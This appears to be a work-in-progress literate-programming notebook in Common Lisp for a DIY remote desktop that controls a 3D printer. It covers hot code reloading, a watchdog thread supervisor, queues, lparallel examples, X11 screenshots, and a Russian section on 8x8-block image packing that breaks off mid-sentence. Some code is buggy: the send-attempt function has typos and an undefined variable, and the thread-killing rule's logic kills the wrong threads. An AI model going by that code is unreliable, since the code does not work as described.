#+STARTUP: showall indent hidestars
#+HTML_HEAD: <link rel='stylesheet' type='text/css' href='./css/style.css'/>

* Intro

[[file:./img/rc-intro.png]]

How to control a 3D printer from the next room, if the "next room" can be in another country, and there is only a GUI application to control it?

Elementary! It is enough to put a laptop next to it, point the laptop camera at the working area, understand how to get images from the screen, and control the mouse and keyboard.

A kind of "remote desktop", made by your own hands.

* Decomposition

Split it to Client and Server.

Server:
- takes screenshots
- sends screenshots to the channel
- reads commands from the channel
- executes commands

Client:
- receives screenshots
- shows screenshots to the user (or even automatically analyzes screenshots to react to them)
- generates commands to send to the Server
- sends commands to the channel

Both the Client and the Server need to be able to establish a communication channel, maintain it, and minimize the size of the sent data by packing it.

The server must also be able to update itself "on the fly" when it receives appropriate commands from the Client.

The channel of communication does not necessarily exist permanently. Sometimes the connection may be unavailable. In this case, the Server must balance the strategy of "save as many screenshots as possible, and then send them when the connection is restored" with the strategy of minimizing the channel load.

For all such high-level decision, it is convenient to design a language in which to describe them. This language will be used so that the Client can change the behavior of the Server without having to patch it, which is fraught with bugs.

Basic commands:

#+BEGIN_SRC lisp
  (take-screenshot)
  (send-screenshot)
  (receive-command)
  (execute-command)

  (receive-screenshot)
  (show-screenshot)
  (make-command)
  (send-command)

  (open-connection)
  (close-connection)
#+END_SRC

Simplified workflow:

#+BEGIN_SRC plantuml :file ./img/rc-workflow.png
  hide empty description

  state Server {
      take_screenshot -right-> send_screenshot
      send_screenshot -right[dotted,#blue]-> snd_srv_queue
      send_screenshot -down-> receive_command
      rcv_srv_queue -left[dotted,#blue]-> receive_command
      receive_command -left-> execute_command
      execute_command -up-> sleep_server
      sleep_server -up-> take_screenshot
  }

  state Client {
      send_command -left[dotted,#blue]-> snd_clt_queue
      rcv_clt_queue -right[dotted,#blue]-> receive_screenshot
      receive_screenshot -right-> show_screenshot
      show_screenshot -down-> make_command
      make_command -left-> send_command
      send_command -up-> sleep_client
      sleep_client  -up-> receive_screenshot
  }

  snd_srv_queue -[#green]> rcv_clt_queue
  snd_clt_queue -left[#green]-> rcv_srv_queue
#+END_SRC

#+results:
[[file:./img/rc-workflow.png]]

[[file:./img/rc-workflow.png]]

* Unreliable delivery

If the connection is unstable, an attempt to send a screenshot may cause a hang state. A hung attempt to send has a state and takes up memory, so the Server needs a strategy to manage this. For example, the Server can kill hung send attempts if they don't finish successfully within maximum time. Or if there are too many hanged attempts - the Server may try to reconnect. It can be expressed like this:

#+BEGIN_SRC lisp
  (defun try-to-send-screenshot (screenshot-data)
    (let ((attempt (send-screenshot screenshot-data)))
      (push attempt *list-of-attempts*)
      (let ((current-time (get-internal-real-time))
            (failed-attempts-cnt 0))
        (dolist (attempt *list-of-attempts*)
          (when (> (+ (time-of-birth attemp) max-time) current-time)
            (dismiss attempt)))
        (dolist (attempt *list-of-attempts*)
          (when (equal :dismissed (status attemp))
            (incf failed-attempts-cnt)))
        (when (> kill-cnt max-failed-attempts)
          (try-to-reconnect)))))
#+END_SRC



#+BEGIN_SRC plantuml :file ./img/rc-attempt-strategy.png
  start
  :Attempt to send a screenshot;
  :Push attempt to list of attempts;

  #white:(A)

  group dismiss the hang-up attempts to send
    repeat
      :select the current attempt;
      if (does selected attempt exist longer than necessary?) then (yes)
        :dismiss current attempt;
      endif
    repeat while (do we still have any unprocessed attempts??) is (yes)
    ->no;
  end group

  #white:(B)

  group counting the number of dismissed attempts;
    repeat
      :select the current attempt;
      if (the selected attempt is in the state of being dismissed?) then (yes)
        :increase the counter of attempts in the dismissed state;
      endif
    repeat while (do we still have any unprocessed attempts??) is (yes)
    ->no;
  end group

  #white:(C)

  if (counter of attempts in the dismissed state too big?) then (yes)
    :try to reconnect;
  endif

  stop
#+END_SRC

#+results:
[[file:./img/rc-attempt-strategy.png]]

[[file:./img/rc-attempt-strategy.png]]

* Hot code reloading

The Client can send a command to the Server, which will redefine the strategy:

#+BEGIN_SRC lisp
  (send-command
   :hot-reload-code
   '(:name try-to-send-screenshot
     (lambda (screenshot-data)
       ...)))
#+END_SRC

This way, you can define only the functions needed to provide hot reloading code and add the rest through the reloading mechanism.

At this point, the only thing required of ~send-command~ is to throw parameters to ~hot-reload-code~:

Actually, ~send-command~ has to send a command to the communication channel, which doesn't exist yet, so now you can only define ~hot-reload-code~:

#+NAME: hot-reload-code
#+BEGIN_SRC lisp
  (defmacro hot-reload-code (name code)
    `(defparameter ,(intern (concatenate 'string "*" (symbol-name name) "*"))
                            ,code))
#+END_SRC

This function is very simple, it puts the result of the executed code in a variable with the appropriate name. The content of this variable can be replaced atomically during the next code reload. For example, this is how you can create a function in a *sub* variable that subtract up two numbers:

#+BEGIN_SRC lisp
  (hot-reload-code
   :sub
   (lambda (a b) (- a b)))
#+END_SRC

And it really works:

#+BEGIN_SRC lisp
  (funcall *sub* 6 3)
  => 3 (2 bits, #x3, #o3, #b11)
#+END_SRC

However, the benefit of functions is that they call each other, but as a result of uncoordinated hot restarts of the code when called, there may be errors.

Here we can use the ~safe-call~ macro helper, which provides error handling if there is a problem with the called function:

#+NAME: with_safe_call
#+BEGIN_SRC lisp
  (defmacro with-safe-call ((err-var &body err-handler)
                            func-var &rest params)
    `(handler-case
         (funcall
          ,(intern (concatenate  'string "*" (symbol-name func-var) "*"))
          ,@params)
       (t (,err-var) ,@err-handler)))
#+END_SRC

This macro helper turns a function call into an exception handler and illustrates the idea of "defensive programming":

#+BEGIN_SRC lisp
  (macroexpand-1
   '(with-safe-call (err (format nil "SAFE-CALL-ERROR: ~A" err))
     :div 12 3))

  =>
  (handler-case (funcall *div* 12 3)
    (t (err) (format nil "SAFE-CALL-ERROR: ~A" err)))
#+END_SRC

Now if we call the *DIV* function via SAFE-CALL, we will get an error handled, because the *DIV* variable has not yet been defined:

#+BEGIN_SRC lisp
  (with-safe-call (err (format nil "SAFE-CALL-ERROR: ~A" err))
                  :DIV 12 3)

  => "SAFE-CALL-ERROR: The variable *DIV* is unbound."
#+END_SRC

Now if you define *DIV*, the call will return the correct result:

#+BEGIN_SRC lisp
  (hot-reload-code
   :DIV
   (lambda (param-a param-b)
     (block div-ret-block
       (when (= 0 param-b)
         (error 'DIVISION-BY-ZERO))
       (let ((cnt 0))
         (loop while (>= param-a param-b)
               do (setf param-a
                        (with-safe-call
                            (err (format nil "ERR: ~A" err))
                            :SUB param-a param-b)
                        cnt (+ 1 cnt))
                  (unless (numberp param-a)
                    (return-from div-ret-block param-a)))
         cnt))))

  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 12 3)
  => 4 (3 bits, #x4, #o4, #b100)
#+END_SRC

Now, if I define a *DIV* which calls *SUB* to subtract the second parameter from the first parameter, the call will return the correct result.

The call is made through WITH-SAFE-CALL, so any error in the called function will be handled.

The calling function will only continue if there are no errors.

This way we can have erroneous functions in the hot code reload code process, but it will not cause a crash because all errors will be handled if any function that can be replaced is called with-safe-call

For example, if we try to divide by zero, we will get a division by zero error handled

#+BEGIN_SRC lisp
  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 1 0)
  => "ERR: arithmetic error DIVISION-BY-ZERO signalled"
#+END_SRC

The same happens if we remove the SUB variable, the DIV just can't find the function it depends on, but handles this situation correctly:

#+BEGIN_SRC lisp
  (unbound-variable  *sub*)

  (makunbound '*sub*)

  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 1 1)
  => "ERR: The variable *SUB* is unbound."
#+END_SRC

* Panic

When code is hot-reloaded, something can go wrong, and then continuing to work can have unpredictable consequences.

The program can detect an abnormal situation and to prevent a disaster go into "panic" mode.

When the ~*PANIC*~ flag is not NIL the program should not continue normal operation. Instead it should save what can be saved correctly if possible and proceed to the failure analysis and recovery procedures. For example, it could try to recover to the last working state, or do something else.

#+NAME: panic
#+BEGIN_SRC lisp
  (defparameter *PANIC* nil)
#+END_SRC

* Logging and debug print

In the simplest way, any errors should cause an error message to be sent to the console for debugging purposes. This is done using the ~DBG~ macro, which accepts the error message and parameters in FORMAT-style.

When you want to display something on the screen, for example an error message in a multithreaded program, the threads should not interfere with each other. So we use a mutex wrapped in the with-recursive-lock-held macro of the bordeaux-threads package. This package is used to manage threads.

A recursive lock differs from an ordinary lock in that a thread that already holds the recursive lock can acquire it again without blocking. The thread must then release the lock twice before it becomes available for another thread.

#+NAME: dbg
#+BEGIN_SRC lisp
  (defparameter *OUTLOCK*
    (bt:make-recursive-lock "output-lock"))

  (defmacro bprint (var)
    `(subseq (with-output-to-string (*standard-output*)
               (pprint ,var)) 1))

  (defmacro dbg (msg &rest params)
    "debug output with lock"
    `(bt:with-recursive-lock-held (*OUTLOCK*)
       (format t ,msg ,@params)
       (finish-output)))
#+END_SRC

* Main loop

When the Client or the Server starts up, it enters a (conditionally) infinite loop in which the PHOENIX, which we'll talk about in the next section, is started every *SLEEP-INTERVAL* seconds. It is started through the ~with-safe-call~ mechanism we just talked about.

To atomically break this infinite loop, the variable *MAIN-LOOP-STOP* is used, which must be equal to NIL as long as the loop has to run.

If it is not NIL, its contents will be executed through ~WITH-SAFE-CALL~ and this gives us a way to atomically update the whole world.

#+NAME: main_loop
#+BEGIN_SRC lisp
  (defparameter *WATCHDOG-TIMER* 0)
  (defparameter *MAIN-LOOP-STOP* nil)
  (defparameter *SLEEP-INTERVAL* 3)

  (defun main-loop ()
    (setf *WATCHDOG-TIMER* 0)
    (tagbody
     infinite
       (when *MAIN-LOOP-STOP*
         (with-safe-call
             (err
               (dbg "~%ERR: ~A Trying to stop the main loop." err))
             :MAIN-LOOP-STOP)
         (go end))
       (dbg "~%::main-loop WDG=~3,'0D" *WATCHDOG-TIMER*)
       (with-safe-call (err (dbg "~%ERR: ~A" err))
                       :PHOENIX)
       (sleep *SLEEP-INTERVAL*)
       (incf *WATCHDOG-TIMER*)
       (go infinite)
     end
       (dbg "~%::the MAIN-LOOP is correctly terminated")))
#+END_SRC

Activity Diagram:

#+BEGIN_SRC plantuml :file ./img/rc-main-loop.png
  start
  :clear WATCHDOG_TIMER value;
  while (MAIN_LOOP_STOP is clear?) is (Yes)
     :debug print WATCHDOG_TIMER value;
     :try to call PHOENIX;
     :increment WATCHDOG_TIMER value;
  endwhile
  :try to call MAIN_LOOP_STOP;
  :debug print exit message;
  stop
#+END_SRC

#+results:
[[file:./img/rc-main-loop.png]]

[[file:./img/rc-main-loop.png]]

* Minimal tangled program

Now you can build a minimal working program:

#+NAME: min
#+BEGIN_SRC lisp :tangle ./src/min.lisp :noweb yes :exports code
  (ql:quickload "alexandria")
  (use-package :alexandria)
  (ql:quickload "cl-ppcre")
  (use-package :ppcre)
  (ql:quickload "bordeaux-threads")

  <<panic>>

  <<dbg>>

  <<with_safe_call>>

  <<main_loop>>
#+END_SRC

If you run ~main-loop~ this minimal program will start.

Every 3 seconds it will try to safely run *PHOENIX*, which doesn't exist yet, get an error here and start again until we get tired of it and change the value of the *MAIN-LOOP-STOP* variable to T for example.

Then the program will try to execute *MAIN-LOOP-STOP*, get an error and exit correctly.

#+BEGIN_SRC lisp
  ::main-loop WDG=000
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=001
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=002
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=003
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=004
  ERR: The variable *PHOENIX* is unbound.
  ERR: The function COMMON-LISP:T is undefined. Trying to stop the main loop.
  ::the main-loop is correctly terminated
#+END_SRC

* Phoenix

So, the ~MAIN-LOOP~ synchronously starts the ~PHOENIX~ and then goes to sleep so as not to waste CPU time waiting.

This means that ~PHOENIX~ must complete its tasks and die quickly. After a sleep, the ~PHOENIX~ will be revived from the ashes and do its job again.

What tasks does the ~PHOENIX~ perform?

He creates the threads and controls them. Threads do all the dirty work, deal with unstable network connections, and are prone to hang-ups. If ~PHOENIX~ has reason to suspect that a thread is hanging, ~PHOENIX~ should kill the thread.

~PHOENIX~ is very suspicious; he doesn't trust threads that run too long. ~PHOENIX~ only likes threads that behave like ~PHOENIX~ himself - doing their job quickly and dying.

To determine how long a thread lives, ~PHOENIX~ can analyze how familiar it is to him. If ~PHOENIX~ sees a familiar thread in each new life, ~PHOENIX~ understands that it has met that thread in past lives.

But it is possible to do the same thing in a more optimal way.

We can name threads so that their name contains the value of the watchdog timer when the thread starts. Then we can subtract the actual watchdog value and find out the age of the thread.

** Terminating long-lived threads

This can be expressed as a rule that will kill threads that live too long:

[TODO:gmm] - https://github.com/LispCookbook/cl-cookbook/issues/386

#+NAME: rule_of_killing_threads_by_time
#+BEGIN_SRC lisp
  (defmacro with-panic-safe-call (name &rest params)
    `(with-safe-call
         (err (progn
                (setf *PANIC* t)
                (dbg "~%ERR: ~A" err)))
         ,name
         ,@params))

  (defparameter *GET-THREAD-WDG-BY-NAME*
    (lambda (thread-name)
      "returns wdg value from thread-name or nil"
      (multiple-value-bind (match regs)
          (scan-to-strings "\.*\\s+wdg=([0-9]*)"
                           thread-name)
        (when match
          (parse-integer (aref regs 0))))))

  (defconstant +max-thread-age+ 5)

  (defparameter *rule-of-killing-threads-by-time*
    (lambda ()
      (loop :for thr :in (bt:all-threads) :do
        (let* ((wdg (with-panic-safe-call :GET-THREAD-WDG-BY-NAME
                      (bt:thread-name thr))))
          (unless (equal nil wdg)
            (let ((age  (- *WATCHDOG-TIMER* wdg)))
              (or (> 0 age) ;; overflow *watchdog-timer*
                  (> age +MAX-THREAD-AGE+)
                  (unless *PANIC*
                    (bt:destroy-thread thr)))))))))
#+END_SRC

Suppose we name threads as "thread-type-name wdg=123", where "123" is the value of ~*WATCHDOG-TIMER*~ at the moment when this thread was created. Then the ~GET-THREAD-WDG-BY-NAME~ helper function, when safely called, will return "12345" to us.

If the current value of ~*WATCHDOG-TIMER*~ reaches "129", it means that the thread has been alive for 6 epochs (i.e. PHOENIX has restarted 6 times). If ~MAIN-LOOP~ falls asleep for 3 seconds after a PHOENIX restart, it means that the thread is already alive for more than 6*3=18 seconds, which is clearly more it should be.

So the ~RULE-OF-KILLING-THREADS-BY-TIME~ procedure should kill this thread if it sees that it lives more than ~+MAX-THREAD-AGE+~ epochs. [TODO:gmm] - What happens if the thread being killed is holds a lock?

It is also possible that ~*WATCHDOG-TIMER*~ is less than the value returned by ~GET-THREAD-WDG-BY-NAME~. It is possible when ~*WATCHDOG-TIMER*~ overflows and we kill all such threads without waiting until ~*WATCHDOG-TIMER*~ becomes big enough to keep a thread alive longer than expected.

The same mechanism (resetting ~*WATCHDOG-TIMER*~) can be used to restart all the threads.

[TODO:gmm] - We can also provide a negative value of ~*WATCHDOG-TIMER*~ to use it for something else, like recovering from a panic.

We will go into a panic state if, for example, when trying to call the ~GET-THREAD-WDG-BY-NAME~ procedure safely, it is found that this variable does not exist.

** Creating new threads

Now we have to make up for the lost threads somehow. To do this we will write a rule that will create missing threads if their number is less than ~+MIN-THREAD-POOL-SIZE+~

#+NAME: rule_of_creating_new_threads
#+BEGIN_SRC lisp
  (defparameter *WORKING-THREAD-STOP-FLAG* nil)

  (defparameter *WORKING-THREAD-FUNC*
    (lambda ()
      (let ((work-cnt 0)
            (work-cnt-max (random 40)))
        (tagbody
         work-repeat
           (when *WORKING-THREAD-STOP-FLAG*
             (go work-exit))
           (when (> work-cnt work-cnt-max)
             (go work-exit))
           (sleep 1)
           (go work-repeat)
         work-exit))))

  (defconstant +MIN-THREAD-POOL-SIZE+ 3)

  (defparameter *RULE-OF-CREATING-NEW-THREADS*
    (lambda ()
      (let ((working-threads-cnt 0))
        (loop :for thr :in (bt:all-threads) :do
          (let* ((wdg (with-panic-safe-call
                        :get-thread-wdg-by-name
                        (bt:thread-name thr))))
            (unless (equal nil wdg)
              (incf working-threads-cnt))))
        (when (> +MIN-THREAD-POOL-SIZE+ working-threads-cnt)
          (dotimes (idx (- +MIN-THREAD-POOL-SIZE+
                           working-threads-cnt))
            (bt:make-thread
             #'(lambda ()
                 (with-panic-safe-call
                   :WORKING-THREAD-FUNC))
             :name (format nil "++(~A)working-thread wdg=~D"
                           idx *WATCHDOG-TIMER*)
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*PANIC* . ,*PANIC*)
               (*working-thread-stop-flag* . ,*working-thread-stop-flag*))))))))

  ;; (funcall *rule-of-creating-new-threads*)

  ;; (bt:all-threads)

  ;; =>
  ;; #<SB-THREAD:THREAD "main thread" RUNNING {1001838103}>
  ;; #<SB-THREAD:THREAD "Swank Sentinel" RUNNING {10019B0AF3}>
  ;; #<SB-THREAD:THREAD "control-thread" RUNNING {1001BEE4E3}>
  ;; #<SB-THREAD:THREAD "swank-indentation-cache-thread" RUNNING {1001BEEC03}>
  ;; #<SB-THREAD:THREAD "reader-thread" RUNNING {1004E62FE3}>
  ;; #<SB-THREAD:THREAD "++(1)working-thread wdg=0" RUNNING {1003631073}>
  ;; #<SB-THREAD:THREAD "++(2)working-thread wdg=0" RUNNING {1003631383}>
  ;; #<SB-THREAD:THREAD "repl-thread" RUNNING {1002BB9DC3}>
  ;; #<SB-THREAD:THREAD "worker" RUNNING {10036402F3}>
  ;; #<SB-THREAD:THREAD "++(3)working-thread wdg=0" RUNNING {1003631693}>
  ;; #<SB-THREAD:THREAD "++(0)working-thread wdg=0" RUNNING {1003630C03}>
  ;; #<SB-THREAD:THREAD "auto-flush-thread" RUNNING {1004E62F53}>

#+END_SRC

** Rule-processor

Now that we have at least two rules for creating and deleting threads, we can build a list of rules.

This is very important, because the contents of the list of rules (and the order of the rules in the list) will determine the logic of the whole program.

#+NAME: rulez
#+BEGIN_SRC lisp
  (defclass rulez ()
    ((lst :initarg :lst)))

  (defparameter *LIST-OF-RULES*
    (make-instance 'rulez
                   :lst `(*rule-of-killing-threads-by-time*
                          ,*rule-of-creating-new-threads*)))

  (defmethod run ((rlz rulez))
    (loop for rule in (slot-value *list-of-rules* 'lst) :do
      (funcall (symbol-value rule))))
#+END_SRC

** Minimal Phoenix program

Now if we add phoenix to the minimal program obtained in the previous step, we get a thread supervisor that creates and removes threads as they exceed the maximum running time

#+BEGIN_SRC plantuml :file ./img/main_loop_and_phoenix_activity.png
  |MAIN_LOOP|
    start
    :clear WATCHDOG_TIMER value;
    while (MAIN_LOOP_STOP is clear?) is (Yes)
       :debug print WATCHDOG_TIMER value;
       :try to call PHOENIX;

       if (PHOENIX is exists?) is (exists) then
  |#AntiqueWhite|PHOENIX|
       :rule of killing threads by time;
       :rule of creating new threads;
  |MAIN_LOOP|
       else (not exists)
       endif

       :increment WATCHDOG_TIMER value;
    endwhile
    :try to call MAIN_LOOP_STOP;
    :debug print exit message;
    stop
#+END_SRC

#+results:
[[file:./img/main_loop_and_phoenix_activity.png]]

[[file:./img/main_loop_and_phoenix_activity.png]]


#+NAME: min_phoenix
#+BEGIN_SRC lisp :tangle ./src/min_phoenix.lisp :noweb yes :exports code
  <<min>>

  <<rule_of_killing_threads_by_time>>

  <<rule_of_creating_new_threads>>

  <<rulez>>

  (defparameter *phoenix*
    (lambda ()
      (run *list-of-rules*)))

  ;; (main-loop)

  ;; (bt:all-threads)
#+END_SRC

* Queues and locks

Now that Phoenix controls the threads, it's impossible to predict when a thread will be killed because it takes too long to fiddle with its bit of work.

To manage this we can have three queues: ~TODO~, ~IN-PROGRESS~, and ~DONE~ to keep track of the state of the work.

Since threads compete for jobs, we need to access these queues exclusively, with critical sections protected by mutexes - one mutex per queue

#+NAME: queue
#+BEGIN_SRC lisp
  (defclass queue ()
    ((lst   :initform  nil)
     (lock  :initarg   :lock)))

  (defmethod enque ((que queue) task)
    (bt:with-recursive-lock-held ((slot-value que 'lock))
      (setf (slot-value que 'lst)
            (append (slot-value que 'lst)
                    (list task)))))

  (defmethod deque ((que queue))
    (bt:with-recursive-lock-held ((slot-value que 'lock))
      (pop (slot-value que 'lst))))


  (defparameter *TODO*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "todo-lock")))

  (defparameter *IN-PROGRESS*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "in-progress-lock")))

  (defparameter *DONE*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "done-lock")))


  ;; (slot-value *TODO* 'lst)

  ;; (enque *TODO* 3)

  ;; (deque *TODO*)
#+END_SRC

* Tasks

[TODO:gmm] - Use LPARALEL https://lispcookbook.github.io/cl-cookbook/process.html#joining-on-a-thread-destroying-a-thread

Now we need to form tasks, which we will pass in the chain. Each task will capture the data it works with.

#+NAME: task
#+BEGIN_SRC lisp
  (defclass task ()
    ((initial :accessor initial)))
#+END_SRC

* Lparallel

#+BEGIN_SRC lisp
  (ql:quickload "lparallel")
  (ql:quickload "serapeum")
  (ql:quickload "bt-semaphore")
  (use-package :lparallel)
  (use-package :lparallel.queue)
  (use-package :bt-semaphore)

  (defun init ()
    (setf lparallel:*kernel*
          (lparallel:make-kernel (serapeum:count-cpus)
                                 :name "channel-queue-kernel")))
  (init)


  (defun shutdown ()
    (end-kernel :wait t))

  ;; (shutdown)

  (defun show-kernel-info ()
    (let ((name (lparallel:kernel-name))
          (count (lparallel:kernel-worker-count))
          (context (lparallel:kernel-context))
          (bindings (lparallel:kernel-bindings)))
      (format t "Kernel name = ~a~%" name)
      (format t "Worker threads count = ~d~%" count)
      (format t "Kernel context = ~a~%" context)
      (format t "Kernel bindings = ~a~%" bindings)))

  (show-kernel-info)


  (defun calculate-square (n)
    (let* ((channel (lparallel:make-channel))
           (res nil))
      (lparallel:submit-task channel
                             (lambda (x)
                               (* x x))
                             n)
      (setf res (lparallel:receive-result channel))
      (format t "Square of ~d = ~d~%" n res)))

  (calculate-square 25)


  (defun test-basic-channel-multiple-tasks ()
    (let ((channel (make-channel))
          (res '()))
      (submit-task channel (lambda (x)
                             (* x x))
                   10)
      (submit-task channel (lambda (y)
                             (* y y y))
                   10)
      (submit-task channel (lambda (z)
                             (* z z z z))
                   10)
      (dotimes (i 3 res)
        (push (receive-result channel) res))))

  (test-basic-channel-multiple-tasks)


  (defun test-promise ()
    (let ((p (promise)))
      (loop
        do (if (evenp (read))
               (progn
                 (fulfill p 'even-received!)
                 (return))))
      (force p)))

  (test-promise)


  (defun promise-with-threads ()
    (let ((p (promise))
          (stream *query-io*)
          (n (progn
               (princ "Enter a number: ")
               (read))))
      (format t "In main function...~A~%" p)
      (bt:make-thread
       (lambda ()
         (sleep (random 10))
         (format stream "Inside thread... fulfilling promise ~A~%" p)
         (fulfill p (* n n))))
      (bt:make-thread
       (lambda ()
         (loop
           when (fulfilledp p)
             do (return)
           do (progn
                (format stream "~d~%" (random 100))
                (sleep (* 0.01 (random 100)))))))
      (format t "Inside main function, received value: ~d~%" (force p))))

  (promise-with-threads)


  (defun test-future ()
    (let ((f (future
               (sleep (random 5))
               (print "Hello from future!"))))
      (loop
        when (fulfilledp f)
          do (return)
        do (sleep (* 0.01 (random 100)))
           (format t "~d~%" (random 100)))
      (format t "~d~%" (force f))))

  (test-future)


  (defun callback-promise-future-demo ()
    (let* ((p (promise))
           (stream *query-io*)
           (n (progn
                (princ "Enter a number: ")
                (read)))
           (f (future
                (sleep (random 10))
                (fulfill p (* n n))
                (force (future
                         (format stream "Square of ~d = ~d~%" n (force p)))))))
      (loop
        when (fulfilledp f)
          do (return (force p))
        do (sleep (* 0.01 (random 100))))))

  (callback-promise-future-demo)


  (defun list-of-promises-future-demo (n)
    (let* ((futures)
           (stream *query-io*))
      (dotimes (i n)
        (let* ((number (progn
                         (princ (format nil "~%Enter a number (~d): " i))
                         (read)))
               (promise (promise)))
          (push (future
                  (sleep (random 10))
                  (fulfill promise (* number number))
                  (force (future
                           (sleep 1)
                           (format stream "~%Square of ~d = ~d"
                                   number
                                   (force promise))
                           (force promise))))
                futures)))
      (loop
        do (sleep 1)
        until (loop for f in futures always (fulfilledp f))
        finally (return (loop for f in futures collect (force f))))))

  (list-of-promises-future-demo 3)


  (defun test-queue-properties ()
    (let ((queue (make-queue :fixed-capacity 5)))
      (loop
        when (queue-full-p queue)
          do (return)
        do (push-queue (random 100) queue))
      (print (queue-full-p queue))
      (loop
        when (queue-empty-p queue)
          do (return)
        do (print (pop-queue queue)))
      (print (queue-empty-p queue)))
    nil)

  (test-queue-properties)

  (defun test-basic-queue ()
    (let ((queue (make-queue))
          (channel (make-channel))
          (res '()))
      (submit-task channel
                   #'(lambda ()
                       (loop for entry = (pop-queue queue)
                             when (queue-empty-p queue)
                               do (return)
                             do (push (* entry entry) res))))
      (dotimes (i 100)
        (push-queue i queue))
      (receive-result channel)
      (format t "~{~d ~}~%" res)))

  (test-basic-queue)
#+END_SRC

* Screenshot

How to make screenshot:

#+NAME: x_snapshot
#+BEGIN_SRC lisp :padline no
  (ql:quickload "clx")
  (ql:quickload "zpng")

  (defmacro with-display (host (display screen root-window) &body body)
    `(let* ((,display (xlib:open-display ,host))
            (,screen (first (xlib:display-roots ,display)))
            (,root-window (xlib:screen-root ,screen)))
       (unwind-protect (progn ,@body)
         (xlib:close-display ,display))))

  (defmacro with-default-display ((display &key (force nil)) &body body)
    `(let ((,display (xlib:open-default-display)))
       (unwind-protect
            (unwind-protect
                 ,@body
              (when ,force
                (xlib:display-force-output ,display)))
         (xlib:close-display ,display))))

  (defmacro with-default-display-force ((display) &body body)
    `(with-default-display (,display :force t) ,@body))

  (defmacro with-default-screen ((screen) &body body)
    (let ((display (gensym)))
      `(with-default-display (,display)
         (let ((,screen (xlib:display-default-screen ,display)))
           ,@body))))

  (defmacro with-default-window ((window) &body body)
    (let ((screen (gensym)))
      `(with-default-screen (,screen)
         (let ((,window (xlib:screen-root ,screen)))
           ,@body))))

  (defun x-size ()
    (with-default-screen (s)
      (values
       (xlib:screen-width s)
       (xlib:screen-height s))))

  (defparameter *default-x* 0)
  (defparameter *default-y* 0)
  (defparameter *default-width* 800)
  (defparameter *default-height* 600)

  (defun init-defaults ()
    (multiple-value-bind (width height)
        (x-size)
      (setf *default-width* width
            ,*default-height* height
            ,*default-x* 0
            ,*default-y* 0)))

  (init-defaults)

  (defun raw-image->png (data width height)
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type :truecolor-alpha
                               :image-data data))
           (data (zpng:data-array png)))
      (dotimes (y height)
        (dotimes (x width)
          ;; BGR -> RGB, ref code: https://goo.gl/slubfW
          ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
          (rotatef (aref data y x 0) (aref data y x 2))
          (setf (aref data y x 3) 255)))
      png))

  (defun x-snapshot (&key (x *default-x*) (y *default-y*)
                       (width  *default-width*) (height *default-height*)
                       path)
    ;; "Return RGB data array (The dimensions correspond to the height, width,
    ;; and pixel components, see comments in x-snapsearch for more details),
    ;; or write to file (PNG only), depend on if you provide the path keyword"
    (with-default-window (w)
      (let ((image
             (raw-image->png
              (xlib:get-raw-image w :x x :y y
                                  :width width :height height
                                  :format :z-pixmap)
              width height)
            ))
        (if path
            (let* ((ext (pathname-type path))
                   (path
                    (if ext
                        path
                        (concatenate 'string path ".png")))
                   (png? (or (null ext) (equal ext "png"))))
              (cond
                (png? (zpng:write-png image path))
                (t (error "Only PNG file is supported"))))
            ;; else - return image array
            (zpng:data-array image)))))

  ;; (x-snapshot
  ;;  :path "x-snapshot-true-color-telegram.png")
#+END_SRC

* Conv8x8

Мы можем разбить скриншот на квадраты 8*8 пикселей. Большинство из таких квадратов будут содержать один цвет - мы предполагаем что такие квадраты содержат цвет фона. Они нам не интересны, т.к. вероятно, что они не содержат полезной текстовой информации. Поэтому было бы логично иметь для каждого квадрата флаг, который показывает, заполнен ли этот квадрат одним цветом.

Сколько будет занимать места такой массив в сравнении с исходным изображением? В исходном изображении на каждый 8x8-квадрат требуется (* 8 8 3) =192 байта, против одного бита. Так как в байте 8 бит, то для массив флагов 8x8-квадратов будет в (* 8 8 3 8) =1536 раз меньше чем исходное полноцветное изображение. Поэтому такой массив называется ~packflag~.

Дополнительно к нему нам нужем массив ~packline~, который хранит цвет 8x8-квадрата, при этом мы можем вместо (* 3 8) байтов на цвет ограничиться одним байтом, отбросив младшие биты каждого бита цвета и упаковав их в один байт.

Такая схема дает нам экономию в (+ (* 8 8 3 8) (* 8 8)) =1600 раз по сравнению с оригинальым изображением. При этом мы жертвуем частью информации о цвете и деталях картинки. Это подходит для того чтобы, например, быстро передать thumbnail по сети.

Но работа с битовыми полями байтов требует времени, поэтому, чтобы сохранить скорость обработки, мы можем не заходить так далеко. Мы можем ограничиться массивом байт вместо массива бит для ~packflag~ и трехбайтовыми значениями цвета для ~packline~.

Это даст нам возможность на следующих этапах не обрабатывать 8x8-квадраты которые залиты одним цветом, что тоже даст экономию по скорости.

Раз уж теперь в связи с вышеизложенным у нас каждый элемент ~packflag~ - это байт а не бит, то мы можем практически бесплатно добавить в него информацию о том, на каком пикселе 8x8-квадрата мы обраружили что цвет изменился. Это значение не может быть равно 0, т.к. нулевой пиксель определяет с каким цветом мы будем сравнивать все остальные, чтобы определить залит ли 8x8-квадрат одним цветом. Так как кроме нулевого в 8x8-квадрате всего 63 пикселя, то для размещения позиции изменения цвета нам нужно лишь 6 бит и еще 2 остаются вакантными - они нам понадобятся когда мы дойдем до процесса поиска краев фигур [[*Edge detector][Edge detector]].

С этой дополнительной информацией мы можем заливать цветом фона только часть 8x8-квадрата, который не полностью залит одним цветом, и оставляя остаток незалитым, что позволяет нам не только немного увеличить детализацию, но и ускорить процесс отрисовки (re-conv-8x8).

Краткое резюме для имплементации:

